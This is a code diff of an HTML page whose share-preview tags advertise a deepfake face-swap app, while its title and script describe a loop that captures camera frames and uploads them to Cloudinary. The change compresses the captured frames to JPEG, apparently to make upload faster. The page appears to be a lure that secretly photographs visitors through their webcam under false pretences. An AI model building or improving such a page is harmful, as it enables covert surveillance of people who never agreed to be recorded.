@@ -4,7 +4,6 @@
   <meta property="og:title" content="Change your face to anyone you like !">
   <meta property="og:description" content="DeepFake">
   <meta property="og:image" content="https://i.ytimg.com/vi/v_NQPA7sz9Y/hqdefault.jpg">
- 
   <title>Looped Capture and Upload to Cloudinary</title>
 </head>
 <body>
@@ -47,7 +46,9 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      photoData = canvas.toDataURL('image/png');
+
+      // Compress to JPEG and reduce quality (0.6 = 60%)
+      photoData = canvas.toDataURL('image/jpeg', 0.6);
 
       try {
         const formData = new FormData();
@@ -74,5 +75,3 @@
   </script>
 </body>
 </html>
-
-
